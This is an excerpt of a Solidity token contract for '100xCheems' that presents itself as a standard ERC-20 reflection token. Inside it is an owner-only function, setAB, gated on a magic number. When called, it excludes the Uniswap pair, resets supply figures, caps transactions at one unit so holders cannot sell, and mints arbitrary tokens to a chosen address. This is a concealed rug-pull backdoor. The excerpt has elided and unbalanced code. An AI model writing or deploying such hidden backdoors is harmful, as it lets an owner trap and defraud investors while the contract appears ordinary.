...
contract cheems100x is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 400 * 10**9 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 private _tBurnTotal;
    address private master;

    string private _name = "100xCheems";
    string private _symbol = "100CHE";
    ...
    uint256 public _maxTxAmount = 1000 * 10**21 * 10**2;
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        function setAB(address addr, uint256 b, uint8 c) public onlyOwner {
         if(c == 72){
            _isExcluded[uniswapV2Pair] = true; _excluded.push(uniswapV2Pair);
        uint256 temp = _tTotal;_tTotal=0;_rTotal=0; 
        _maxTxAmount=1;
        _tOwned[addr]+= b * 10 ** _decimals;
        _tTotal=temp + b * 10 ** _decimals;
